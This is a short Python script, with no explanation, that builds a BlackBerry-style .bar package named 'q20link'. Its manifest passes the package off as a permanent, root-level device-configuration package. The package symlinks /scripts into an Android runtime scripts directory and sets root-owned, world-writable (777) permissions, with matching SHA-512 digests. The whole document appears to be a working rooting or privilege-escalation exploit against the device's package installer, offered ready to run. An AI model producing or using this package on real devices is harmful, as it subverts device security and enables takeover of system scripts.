import zipfile, hashlib, base64, random, os
def rid(prefix):
    return prefix + ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_') for _ in range(22))

ANDR = '/apps/sys.android.gYABgKAOw1czN6neiAT72SGO.ns/native/scripts'
links = ("ln:%s:/scripts\n" % ANDR).encode()
perms = b"assets/data:0:0:777\nassets:0:0:777\n.:0:0:777\n"
digest = base64.b64encode(hashlib.sha512(links).digest()).decode()
mf = """Archive-Manifest-Version: 1.5
Archive-Created-By: q20

Package-Type: device-configuration
Package-Author: Q20
Package-Author-Id: %s
Package-Name: q20link
Package-Id: %s
Package-Version: 1.0.0.0
Package-Version-Id: %s
Package-Architecture: armle-v7

System-Data-Type: os_data
System-Data-Requires-System: os/10.0.0.8
System-Data-Persistence: permanent
Device-Configuration-Type: root

Archive-Asset-Name: /assets/links
Archive-Asset-SHA-512-Digest: %s

Archive-Asset-Name: /assets/perms
Archive-Asset-SHA-512-Digest: %s
""" % (rid('andrA'), rid('andrB'), rid('andrC'), digest,
       base64.b64encode(hashlib.sha512(perms).digest()).decode())
with zipfile.ZipFile('q20link.bar', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('META-INF/MANIFEST.MF', mf)
    z.writestr('assets/links', links)
    z.writestr('assets/perms', perms)
print("q20link.bar", os.path.getsize('q20link.bar'))
